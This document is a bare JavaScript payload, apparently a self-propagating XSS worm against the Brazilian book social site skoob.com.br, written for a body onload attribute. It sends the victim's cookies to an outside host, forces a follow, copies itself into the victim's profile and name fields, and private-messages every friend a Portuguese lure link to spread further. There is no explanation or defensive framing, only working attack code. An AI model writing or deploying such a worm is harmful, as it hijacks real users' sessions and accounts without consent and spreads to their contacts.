//<body onload="

var follow = new Image().src='http://www.skoob.com.br/seguir/adicionar/123456';
var cookies = document.cookie;
var steal = new Image().src="http://host/page.php?cookies="+cookies;
var id = cookies.match(/%23(\d*)\;/)[1];
var div = document.createElement('div');
document.body.appendChild(div);
div.style.display = 'none';

var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET','http://www.skoob.com.br/usuario/perfil/' + (window.location.pathname.match(/\/(\d*)$/)[1]) + '/',false);
xmlhttp.send();

var source = xmlhttp.responseText.match(/onload\=\"(.*)\"/)[1];
xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET','http://www.skoob.com.br/usuario/editar_perfil/',false);
xmlhttp.send();
div.innerHTML = xmlhttp.responseText;

var field;
field = document.getElementById('PerfilUsuarioSobre').value;
if((!field) || (field.indexOf("body") < 0)){
  document.getElementById('PerfilUsuarioSobre').value += source;
  document.getElementById("form").submit();
  xmlhttp.open('GET','http://www.skoob.com.br/usuario/editar_cadastro/',false);
  xmlhttp.send();
  div.innerHTML = xmlhttp.responseText;
  var field;
  field = document.getElementById('UsuarioNome').value += '</TITLE><iframe> style="display: none;" src="/usuario/perfil/' + id + '/"></iframe>';
  document.getElementById("form").submit();
}

xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET','http://www.skoob.com.br/amigos/listar/'+id,false);
xmlhttp.send();
div.innerHTML = xmlhttp.responseText;
var friends = {};
friends = document.querySelectorAll('#corpo > div > div > div > a.l12');
for (var i = 0; i < friends.length; i++) {
  xmlhttp = new XMLHttpRequest();
  xmlhttp.open('GET','http://www.skoob.com.br/usuario/'+id, false);
  xmlhttp.send();
  div.innerHTML = xmlhttp.responseText;
  document.getElementById("RecadoPrivado").checked = true;
  document.getElementById("RecadoRecado").value = 'da uma olhada no meu estilo de leitura favorito.. animal. skoob.com.br/usuario/'+id+'/';
  document.getElementsByTagName('form')[1].submit();
}

//">

